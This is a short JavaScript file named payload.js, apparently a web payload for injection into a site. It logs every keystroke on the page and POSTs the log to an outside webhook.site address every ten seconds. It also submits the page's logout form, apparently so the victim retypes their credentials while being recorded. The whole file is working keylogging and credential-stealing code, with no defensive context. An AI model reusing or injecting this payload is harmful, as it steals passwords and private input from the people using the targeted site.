// payload.js
try {
    var log = '';
    document.onkeydown = function(e) {
        log += String.fromCharCode(e.keyCode || e.which);
    };
    console.log('Keylogger started');

    function sendLog() {
        if (log) {
            fetch('https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972', {
                method: 'POST',
                body: log,
                headers: { 'Content-Type': 'text/plain' }
            }).then(() => console.log('Log sent')).catch(err => console.error('Send error:', err));
        }
    }

    setInterval(sendLog, 10000);  // Отправка лога каждые 10 сек

    setTimeout(function() {
        var logoutForm = document.querySelector('form[action*="logout"]');
        if (logoutForm) {
            logoutForm.submit();
            console.log('Logout triggered');
        } else {
            console.log('Logout form not found');
        }
    }, 1500);
} catch (error) {
    console.error('Payload error:', error);

}
